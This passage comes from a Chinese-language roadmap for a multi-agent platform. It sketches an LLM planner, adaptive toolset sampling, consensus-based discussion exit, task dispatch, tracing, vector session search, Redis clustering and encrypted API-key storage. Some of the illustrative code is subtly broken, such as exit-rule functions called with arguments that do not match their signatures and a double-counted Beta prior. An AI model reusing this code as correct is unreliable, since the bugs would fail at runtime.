    return StreamingResponse(gen(), media_type="text/event-stream")
```

#### 验收标准

- [ ] 状态非法转移抛 `InvalidStateTransition`
- [ ] Kill 一个正在运行的 AgentLoop，30s 内 watchdog 自动转 ERROR
- [ ] 前端 `agent-team-config.html` 状态灯实时变化（SSE）
- [ ] 状态变更全部产生 `AGENT_STATE_CHANGED` 事件

---

## 🧠 阶段三：增智— 让 Agent 真的"智能"

> 目标：把 UltraPlan 和 Plaza 从"流程框架"升级成"自适应系统"

### 3.1 UltraPlan 升级为 LLM-driven Planner

**问题编号：** #5
**优先级：** 🟢 P2
#### 当前问题

```python
# chat_harness.py - 现状
def build_plan_from_prompt(prompt: str, available_tools=None):
    if any(kw in lower for kw in ["研究", "分析", "research"]):
        plan.add_step("tool_call", ..., tool_name="web_search")
        plan.add_step("think", ...)
        plan.add_step("tool_call", ..., tool_name="memory_save")
    else:
        plan.add_step("think", ...)
        plan.add_step("respond", ...)
    return plan
```

只有两个分支，覆盖不到 5% 的实际场景。

#### 实施方案

**HybridPlanner（两阶段）：**

```python
# src/backend/agents/planning/hybrid_planner.py

class HybridPlanner:
    """两阶段规划器：fast-path 关键词 + slow-path LLM."""

    async def plan(
        self,
        prompt: str,
        agent: AgentProfile,
        available_tools: List[str],
    ) -> ExecutionPlan:
        # 1. Fast path
        if simple := self._match_simple_intent(prompt):
            return simple

        # 2. Cache lookup
        cache_key = self._hash(prompt, agent.role, available_tools)
        if cached := await self.cache.get(cache_key):
            return cached

        # 3. Slow path: LLM 生成
        plan = await self._llm_plan(prompt, agent, available_tools)
        await self.cache.set(cache_key, plan, ttl=3600)
        return plan

    async def _llm_plan(self, prompt, agent, tools):
        sys_prompt = """你正在为智能体规划任务步骤。

输出严格的 JSON 数组，每项包含:
- action: tool_call | think | respond | delegate
- tool_name: 工具名（仅 tool_call）
- tool_args: 工具参数（仅 tool_call）
- description: 步骤说明
- depends_on: 前置步骤序号列表
- expected_output: 预期产出描述

原则：步骤原子化，明确依赖，避免冗余，最多 8 步。"""

        user_prompt = f"""任务: {prompt}

可用工具: {', '.join(tools)}

智能体角色: {agent.role}
专长: {', '.join(agent.personality.expertise_areas)}

请输出执行计划 JSON:"""

        response = await self.llm.chat_completion(...)
        return self._parse_plan_json(response)
```

**Re-plan 能力：**

```python
class UnifiedAgentLoop:
    async def run(self, prompt: str):
        plan = await self.planner.plan(prompt, self.agent, self.tools)

        for step in plan.steps:
            result = await self._execute_step(step)
            if not result.success and step.priority == "critical":
                # 触发 re-plan
                remaining = plan.steps[step.step_id:]
                new_plan = await self.planner.replan(
                    original_plan=plan,
                    failed_step=step,
                    failure_reason=result.error,
                    remaining_steps=remaining,
                )
                plan.steps = plan.steps[:step.step_id] + new_plan.steps
```

#### 验收标准

- [ ] 给 10 个不同类型的复杂 prompt 跑 HybridPlanner，至少 8 个产出有效多步 plan
- [ ] 平均步骤数 4-8 步
- [ ] Re-plan 触发率：critical 步骤失败时 ≥ 90%
- [ ] Cache 命中率：相似 prompt ≥ 50%

---

### 3.2 Hermes 概率工具集 + 自适应学习

**问题编号：** #6
**优先级：** 🟢 P2
#### 实施方案

**Thompson Sampling 自适应概率：**

```python
# src/backend/agents/hermes_adaptive.py

@dataclass
class ToolsetStats:
    name: str
    success_count: int = 1  # Beta(α, β) 先验 α=β=1
    failure_count: int = 1

    def sample(self) -> float:
        """从 Beta 分布采样使用概率."""
        return random.betavariate(
            self.success_count + 1,
            self.failure_count + 1,
        )

    def update(self, success: bool):
        if success:
            self.success_count += 1
        else:
            self.failure_count += 1


class AdaptiveToolsetSelector:
    """学习哪些工具集对当前 agent + 任务类型最有效."""

    def __init__(self, store: ToolsetStatsStore):
        self.store = store

    def select_toolsets(
        self,
        agent_id: str,
        task_type: str,
        distribution_name: str,
    ) -> List[str]:
        # 1. 加载历史统计
        stats = self.store.load(agent_id, task_type)

        # 2. 对每个工具集采样
        selected = []
        dist = RESEARCH_TOOLSET_DISTRIBUTIONS[distribution_name]
        for ts_name in dist["toolsets"].keys():
            stat = stats.get(ts_name) or ToolsetStats(name=ts_name)
            # 混合静态先验 + 学习的后验
            static_prob = dist["toolsets"][ts_name] / 100.0
            learned_prob = stat.sample()
            # 加权平均（早期更靠静态，后期更靠学习）
            n = stat.success_count + stat.failure_count
            weight = min(n / 50.0, 1.0)  # 50 次后完全靠学习
            final_prob = (1 - weight) * static_prob + weight * learned_prob

            if random.random() < final_prob:
                selected.append(ts_name)
        return selected

    def record_outcome(
        self,
        agent_id: str,
        task_type: str,
        active_toolsets: List[str],
        success: bool,
    ):
        for ts_name in active_toolsets:
            self.store.update_stat(agent_id, task_type, ts_name, success)
```

**集成点：**

- `hermes_research.create_hermes_researcher()` 创建 Agent 时挂载 `AdaptiveToolsetSelector`
- AgentLoop 结束时根据 `finish()` 返回的 success 标志调 `record_outcome()`
- 新增 endpoint: `GET /api/agents/{id}/toolset-stats` 返回学习曲线

#### 验收标准

- [ ] 跑 50 次研究任务后，对当前 agent 的工具集激活率与初始静态概率应有 ≥ 15% 偏差
- [ ] 对比实验：开启 vs 关闭自适应，30 天后任务成功率应有提升
- [ ] 前端有学习曲线可视化

---

### 3.3 Plaza 共识度量 + 动态退出

**问题编号：** #9
**优先级：** 🟢 P2
#### 实施方案

**共识评估器：**

```python
# src/backend/agents/plaza_consensus.py

@dataclass
class ConsensusScore:
    score: float        # 0.0 - 1.0
    reason: str
    dissenting_agents: List[str]
    key_agreements: List[str]
    key_disagreements: List[str]


class ConsensusEvaluator:
    async def evaluate(
        self, disc: Discussion, recent_messages: List[PlazaMessage]
    ) -> ConsensusScore:
        prompt = f"""讨论已进行 {disc.current_round} 轮。

话题: {disc.topic}

本轮发言:
{self._format_messages(recent_messages)}

请评估当前共识度（0.0-1.0）:
- 0.0: 严重分歧，立场对立，难以收敛
- 0.3: 大方向有分歧
- 0.5: 部分共识，关键点仍有争议
- 0.7: 大部分共识，少量细节分歧
- 1.0: 完全共识，可直接产出执行计划

输出 JSON:
{{
  "score": 0.x,
  "reason": "...",
  "dissenting_agents": ["agent_id1", ...],
  "key_agreements": ["..."],
  "key_disagreements": ["..."]
}}"""
        result = await self.chat_fn(...)
        return self._parse(result)
```

**动态退出规则：**

```python
class PlazaEngine:
    EXIT_RULES = {
        "consensus_reached": lambda s, r: s.score >= 0.85 and r >= 2,
        "stalemate": lambda history: (
            len(history) >= 2
            and all(s.score < 0.5 for s in history[-2:])
            and not any(_score_increasing(history))
        ),
        "manual_close": lambda disc: disc.metadata.get("close_requested"),
    }

    async def run_discussion(self, plaza_id, discussion_id):
        consensus_history = []
        for round_num in range(1, disc.max_rounds + 1):
            # ... 执行本轮发言 ...

            score = await self.consensus_evaluator.evaluate(
                disc, recent_messages,
            )
            consensus_history.append(score)

            # 检查所有退出规则
            for rule_name, rule_fn in self.EXIT_RULES.items():
                if rule_fn(score, round_num) or rule_fn(consensus_history):
                    logger.info(f"🎯 Plaza early exit: {rule_name}")
                    await self._broadcast(disc.id, {
                        "type": "early_exit",
                        "reason": rule_name,
                        "score": score.score,
                    })
                    break
            else:
                continue
            break  # 双重 break 跳出 round 循环
```

**立场追踪：**

```python
@dataclass
class StanceHistory:
    agent_id: str
    rounds: Dict[int, str] = field(default_factory=dict)  # round → 立场摘要

    def get_recent_stance(self) -> Optional[str]:
        if not self.rounds:
            return None
        return self.rounds[max(self.rounds.keys())]


# 在 _agent_speak 中注入立场
prompt += f"""
你之前的立场（第 {prev_round} 轮）: {prev_stance}

请在本轮发言中:
- 如果你的立场不变，明确说"我仍然认为..."
- 如果你的立场改变，说明改变的原因
- 不要前后矛盾或回避之前说过的话
"""
```

#### 验收标准

- [ ] 给 5 个 agent 讨论简单话题（"用 Vue 还是 React"），应在 2-3 轮内达成共识并退出
- [ ] 给一个有真分歧的话题（"是否引入 Rust 重写后端"），应走完所有轮次
- [ ] 立场前后一致性：人工抽查 5 个 agent 的发言，前后矛盾 ≤ 1 次

---

### 3.4 执行计划真正可派发

**问题编号：** #10
**优先级：** 🟢 P2
#### 实施方案

**结构化 PlanItem：**

```python
# src/backend/agents/plaza_plan.py

@dataclass
class PlanItem:
    seq: int
    task: str
    assigned_role: str
    priority: str  # P0/P1/P2
    depends_on: List[int] = field(default_factory=list)
    expected_output: str = ""
    status: str = "pending"
    assignee_agent_id: str = ""
    result: str = ""
    started_at: Optional[float] = None
    completed_at: Optional[float] = None


@dataclass
class StructuredPlan:
    plan_id: str
    discussion_id: str
    summary: str
    items: List[PlanItem]
    created_at: float
```

**Plaza 最终总结改为 JSON 输出：**

```python
final_prompt = f"""你是议事长。请将讨论收敛为可执行的结构化计划。

讨论历史:
{self._format_history(disc)}

输出严格的 JSON:
{{
  "summary": "1-3 句概要",
  "items": [
    {{
      "seq": 1,
      "task": "具体任务描述",
      "assigned_role": "developer|architect|qa|...",
      "priority": "P0|P1|P2",
      "depends_on": [],
      "expected_output": "..."
    }}
  ]
}}
"""
```

**PlanDispatcher：**

```python
class PlanDispatcher:
    def __init__(self, channel_bus: ChannelBus, team_manager: TeamManager):
        self.bus = channel_bus
        self.team_manager = team_manager

    async def dispatch(self, plan: StructuredPlan, team_id: str):
        team = self.team_manager.get_team(team_id)
        for item in plan.items:
            if item.status != "pending":
                continue
            # 找到匹配 role 的 idle agent
            agent = self._find_idle_agent(team, item.assigned_role)
            if not agent:
                logger.warning(f"No idle agent for role {item.assigned_role}")
                continue
            # 发布到 agent 的主频道
            primary_channel = agent.channels[0].channel if agent.channels else "default"
            await self.bus.publish(AgentMessage(
                channel=primary_channel,
                sender_agent_id="plan_dispatcher",
                msg_type="task_assigned",
                payload={
                    "plan_id": plan.plan_id,
                    "item": asdict(item),
                },
            ))
            item.status = "dispatched"
            item.assignee_agent_id = agent.agent_id
```

**前端集成：**

`plaza.html` 增加"派发"按钮，调用：
```
POST /api/plaza/{plaza_id}/discussions/{disc_id}/dispatch
```

显示任务卡片矩阵，每个卡片实时显示 status（pending/dispatched/in_progress/done/failed）。

#### 验收标准

- [ ] Plaza 讨论完成后，`disc.plan.items` 是 List[PlanItem]
- [ ] 点击"派发"按钮，对应 agent 在 5s 内开始执行
- [ ] Plan 进度实时刷新（依赖前面 channels 落地）
- [ ] 失败的任务可以重新派发或修改 assigned_role

---

## 🏗️ 阶段四：稳态— 生产级运维

> 目标：可观测、可扩展、可运营

### 4.1 OpenTelemetry Tracing

**问题编号：** #13
**优先级：** 🔵 P3
#### 实施方案

**集成 OpenTelemetry SDK：**

```python
# src/backend/agents/observability/tracing.py

from opentelemetry import trace
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import BatchSpanProcessor
from opentelemetry.exporter.otlp.proto.http.trace_exporter import OTLPSpanExporter

def init_tracing(service_name: str = "agentsgroup2026"):
    provider = TracerProvider()
    if os.getenv("OTEL_EXPORTER_OTLP_ENDPOINT"):
        provider.add_span_processor(BatchSpanProcessor(OTLPSpanExporter()))
    else:
        # 开发模式：导出到本地 SQLite
        provider.add_span_processor(BatchSpanProcessor(LocalSqliteExporter()))
    trace.set_tracer_provider(provider)
```

**关键 span：**

| Span 名称 | 位置 | 属性 |
|----------|------|------|
| `agent.loop` | `UnifiedAgentLoop.run` | agent_id, role, iterations, tokens |
| `llm.completion` | `LLMClient.chat_completion` | model, latency, input_tokens, output_tokens |
| `tool.execute` | `ToolDispatcher.execute` | tool_name, success, duration |
| `plaza.discussion` | `PlazaEngine.run_discussion` | discussion_id, rounds, message_count |
| `plaza.round` | 每轮讨论 | round_num, speaker_count |
| `skill.extract` | `SkillExtractor` | skill_id, status |
| `channel.publish` | `ChannelBus.publish` | channel, msg_type, sender |

**装饰器辅助：**

```python
def traced(span_name: str = ""):
    def decorator(fn):
        @wraps(fn)
        async def wrapper(*args, **kwargs):
            tracer = trace.get_tracer(__name__)
            name = span_name or f"{fn.__module__}.{fn.__name__}"
            with tracer.start_as_current_span(name):
                return await fn(*args, **kwargs)
        return wrapper
    return decorator
```

**新 endpoint：**

```
GET /api/traces/{trace_id}        # 完整调用树
GET /api/traces/recent             # 最近 100 条 trace
GET /api/traces/slow?threshold=5s  # 慢请求分析
```

#### 验收标准

- [ ] 一次 Plaza 讨论 trace 应能看到所有 agent 发言、LLM 调用、工具调用、token 消耗
- [ ] 支持 Jaeger UI 查看（docker-compose 增加 jaeger 服务）
- [ ] 慢调用阈值告警（> 30s 自动 log error）

---

### 4.2 会话存储迁移到 SQLite + 向量索引

**问题编号：** #7
**优先级：** 🔵 P3
#### 实施方案

**SQLite Schema：**

```sql
-- storage/sessions.db

CREATE TABLE sessions (
    session_id TEXT PRIMARY KEY,
    agent_id TEXT INDEXED,
    created_at REAL,
    updated_at REAL,
    turn_count INTEGER,
    total_input_tokens INTEGER,
    total_output_tokens INTEGER,
    metadata TEXT  -- JSON
);

CREATE TABLE messages (
    msg_id TEXT PRIMARY KEY,
    session_id TEXT REFERENCES sessions(session_id),
    role TEXT,
    content TEXT,
    content_sha256 TEXT,
    timestamp REAL,
    tool_calls TEXT  -- JSON
);

CREATE INDEX idx_msg_session ON messages(session_id);
CREATE INDEX idx_msg_time ON messages(timestamp);

-- 用 sqlite-vec 扩展（或 SQLite VSS）
CREATE VIRTUAL TABLE message_embeddings USING vec0(
    msg_id TEXT PRIMARY KEY,
    embedding FLOAT[384]  -- bge-small-zh 维度
);
```

**向量化（本地模型）：**

```python
# src/backend/agents/persistence/embedder.py

from sentence_transformers import SentenceTransformer

class Embedder:
    """用 BAAI/bge-small-zh 生成本地 embedding（无需联网）."""

    _instance = None

    @classmethod
    def get_instance(cls):
        if cls._instance is None:
            cls._instance = SentenceTransformer("BAAI/bge-small-zh")
        return cls._instance

    def encode(self, text: str) -> List[float]:
        return self.get_instance().encode(text).tolist()
```

**搜索接口：**

```python
class SessionStore:
    async def search_semantic(
        self, query: str, max_results: int = 10,
    ) -> List[SearchResult]:
        embedding = self.embedder.encode(query)
        rows = self.conn.execute("""
            SELECT m.msg_id, m.session_id, m.content,
                   vec_distance_cosine(e.embedding, ?) AS dist
            FROM messages m
            JOIN message_embeddings e ON m.msg_id = e.msg_id
            ORDER BY dist ASC
            LIMIT ?
        """, [embedding, max_results]).fetchall()
        return [SearchResult(**r) for r in rows]
```

**迁移工具：**

```bash
python scripts/migrate_sessions_to_sqlite.py \
    --from storage/sessions/ \
    --to storage/sessions.db
```

#### 验收标准

- [ ] 1000 个会话搜索"用户登录"，应在 100ms 内返回 top-5
- [ ] Hermes session_search 工具切换到新后端，召回率提升 ≥ 30%
- [ ] 旧 JSON 文件可删除（备份后）

---

### 4.3 多实例部署支持

**问题编号：** #1（横向扩展）
**优先级：** 🔵 P3
#### 实施方案

**抽象事件总线接口：**

```python
class EventBusBackend(Protocol):
    async def publish(self, event: DomainEvent) -> None: ...
    async def subscribe(self, event_type: str) -> AsyncIterator[DomainEvent]: ...


class LocalEventBus(EventBusBackend):
    """单进程 asyncio.Queue 实现."""

class RedisEventBus(EventBusBackend):
    """Redis Pub/Sub 实现."""
    def __init__(self, redis_url: str):
        import redis.asyncio as redis
        self.redis = redis.from_url(redis_url)

    async def publish(self, event):
        await self.redis.publish(
            f"event.{event.event_type}",
            json.dumps(asdict(event)),
        )

    async def subscribe(self, event_type):
        pubsub = self.redis.pubsub()
        await pubsub.subscribe(f"event.{event_type}")
        async for msg in pubsub.listen():
            if msg["type"] == "message":
                yield DomainEvent(**json.loads(msg["data"]))
```

**Session 状态搬到 Redis：**

```python
class RedisSessionState:
    """跨实例共享的 session 状态."""

    async def acquire_session_lock(self, session_id: str) -> bool:
        # SET NX with TTL
        return await self.redis.set(
            f"session_lock:{session_id}", instance_id,
            nx=True, ex=300,
        )
```

**任务抢占式分配：**

```python
class DistributedTaskQueue:
    """多实例抢占式任务分配."""

    async def claim_task(self, agent_id: str) -> Optional[Task]:
        # Redis Lua 脚本保证原子性
        script = """
        local task = redis.call('LPOP', KEYS[1])
        if task then
            redis.call('SADD', KEYS[2], task)
            redis.call('EXPIRE', KEYS[2], 1800)
        end
        return task
        """
        ...
```

**配置：**

```json
{
  "deployment": {
    "mode": "single",          // single | cluster
    "redis_url": "redis://localhost:6379/0",
    "instance_id": "auto"      // 启动时生成
  }
}
```

#### 验收标准

- [ ] 启动 3 个后端实例（不同端口）
- [ ] PM 在 instance-1 派发任务，Developer 可能在 instance-2 执行
- [ ] 前端连任一实例，SSE 收到所有实例的事件
- [ ] 任一实例崩溃不丢消息

---

### 4.4 API Key 加密存储

**问题编号：** #12
**优先级：** 🔵 P3
#### 实施方案

**加密层：**

```python
# src/backend/agents/security/key_vault.py

from cryptography.fernet import Fernet

class KeyVault:
    def __init__(self, master_key: str):
        # master_key 来自环境变量 AG_MASTER_KEY
        self.fernet = Fernet(master_key.encode())

    def encrypt(self, plaintext: str) -> str:
        return self.fernet.encrypt(plaintext.encode()).decode()

    def decrypt(self, ciphertext: str) -> str:
        return self.fernet.decrypt(ciphertext.encode()).decode()
```

**ModelConfig 改造：**

```python
@dataclass
class ModelConfig:
    api_key_encrypted: str = ""  # 替代原 api_key
    _decrypted_cache: Optional[str] = field(default=None, repr=False)

    @property
    def api_key(self) -> str:
        if self._decrypted_cache is None and self.api_key_encrypted:
            self._decrypted_cache = get_key_vault().decrypt(self.api_key_encrypted)
        return self._decrypted_cache or ""

    @api_key.setter
    def api_key(self, value: str):
        if value:
            self.api_key_encrypted = get_key_vault().encrypt(value)
            self._decrypted_cache = value
```

**密钥管理：**

```bash
# 生成 master key
python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"

# 启动时
export AG_MASTER_KEY="..."
npm run start
```

**运维文档：**

- `docs/security/key_management.md`
  - master key 备份策略
  - 密钥轮换流程
  - 应急恢复

#### 验收标准

- [ ] `team_store.json` 中 api_key 字段是 base64 密文
- [ ] 无 master key 时启动应给出明确错误
- [ ] 现有 api 调用不受影响（透明加解密）

---

## 🔗 依赖关系图

```
              阶段一 (止血)
   ┌────────────┬────────────┬──────────────┐
   │            │            │              │
1.1 沙箱   1.2 统一Loop  1.3 Budget        │
   │            │            │              │
   └────┬───────┘            │              │
        │                    │              │
        ▼                    ▼              │
              阶段二 (补漏)                 │
   ┌────────────┬────────────┬──────────┐   │
   │            │            │          │   │
2.1 Channels  2.2 Permissions  2.3 State │   │
   │            │            │          │   │
   └────────────┴────────────┴──────────┘   │
        │                    │              │
        ▼                    ▼              ▼
              阶段三 (增智)
   ┌────────────┬────────────┬──────────┐
   │            │            │          │
3.1 LLM Plan  3.2 Hermes自适应  3.3 共识 │
                              │          │
                              ▼          │
                    3.4 派发器 ◄─────────┘
        │
        ▼
              阶段四 (稳态)
   ┌────────────┬────────────┬──────────┐
   │            │            │          │
4.1 Tracing  4.2 向量搜索  4.3 多实例  4.4 加密
```

**关键依赖：**
- 3.4（派发器）依赖 2.1（channels）
- 4.3（多实例）依赖 1.2（统一 Loop） + 2.1（channels 总线抽象）
- 4.1（tracing）应贯穿整个项目，越早开始越好

---

## 🎯 推荐推进方式

| 你的目标 | 推荐范围 | 说明 |
|---------|---------|------|
| 演示 / 学术展示 | 阶段一 + 3.3（共识度量） | 先把安全和执行闭环做稳，再补一个高辨识度产品点 |
| 小团队内部使用 | 阶段一 + 二 完整 | 优先保证统一 runtime、权限、状态和 channels 真的可用 |
| 对外开源精品项目 | 阶段一二三 + 4.1 | 先把“智能”闭环做成，再补 tracing 让外部能看懂系统 |
| 走向商业化产品 | 完整四阶段 | 最后再把多实例、持久化、密钥治理全部补齐 |

---

## ✅ 跨阶段验收里程碑

### M1（阶段一结束）
- [ ] `run_python` 沙箱化完成，安全测试全过
- [ ] 全项目只有一个 AgentLoop 类
- [ ] Token 用量仪表盘可用，预算超限可拦截

### M2（阶段二结束）
- [ ] 至少 2 个 Agent 通过 channels 自主对话（无需 Plaza 编排）
- [ ] permission_denials 表有真实数据
- [ ] Watchdog 杀掉超时 Agent 的事件能在前端实时看到

### M3（阶段三结束）
- [ ] LLM-driven planner 取代硬编码规划
- [ ] Plaza 讨论平均轮数下降（共识快的话题早退出）
- [ ] 一次 Plaza 讨论可端到端派发任务并看到执行结果

### M4（阶段四结束）
- [ ] OpenTelemetry trace 在 Jaeger 中可查
- [ ] 1000 sessions 向量搜索 < 100ms
- [ ] 3 实例 Redis 集群运行无丢消息
- [ ] API Key 全部加密

---

## 📚 附录

### A. 文件改动概览

```
新增模块:
  src/backend/agents/runtime/          # 统一 AgentLoop
  src/backend/agents/messaging/        # ChannelBus
  src/backend/agents/security/         # PermissionResolver, KeyVault
  src/backend/agents/budget/           # TokenBudget
  src/backend/agents/planning/         # HybridPlanner
  src/backend/agents/observability/    # Tracing
  src/backend/agents/persistence/      # SQLite + 向量
  src/backend/sandbox/python_runner.py # Docker 沙箱

主要重构:
  src/backend/agents/agent_loop.py     # 删除（迁移到 runtime/）
  src/backend/agents/chat_harness.py   # 简化（保留 LLMClient 和 ChatSession）
  src/backend/agents/plaza_engine.py   # 增加共识评估、动态退出、JSON 计划
  src/backend/agents/team_manager.py   # 增加 channel 订阅注册

新增表/库:
  storage/usage.db
  storage/sessions.db
  storage/permission_audit.db
```

### B. 兼容性策略

- 数据迁移脚本：`scripts/migrate_v1_to_v2.py`
  - JSON sessions → SQLite
  - 明文 api_key → 加密
  - 旧 plan Markdown → 结构化 PlanItem（best-effort 解析）

- API 兼容：保持现有 endpoint 路径，新功能走 `/api/v2/*`

- 配置兼容：`config/settings.json` schema 向前兼容，缺失字段使用默认值

### C. 风险与回滚

| 风险 | 缓解措施 |
|------|---------|
| Docker 沙箱在某些环境不可用 | 提供 lite 模式 fallback |
| 异步 AgentLoop 引入新 bug | 保留旧 AgentLoop 一个短期兼容 shim |
| Redis 引入运维复杂度 | `mode: single` 默认走本地，仅在需要时切换 |
| 向量化模型增加内存占用 | 用 small 版本（< 100MB），按需加载 |

---

## 📝 修订历史

| 版本 | 日期 | 修订人 | 变更内容 |
|------|------|--------|---------|
| v1.0 | 2026-05-29 | CodeBanana | 初版规划 |

---

**下一步行动：** 以看板优先级持续推进 `W-03 → W-04 → W-01 → N-04`，每完成一项就立即回写状态并进入下一项。
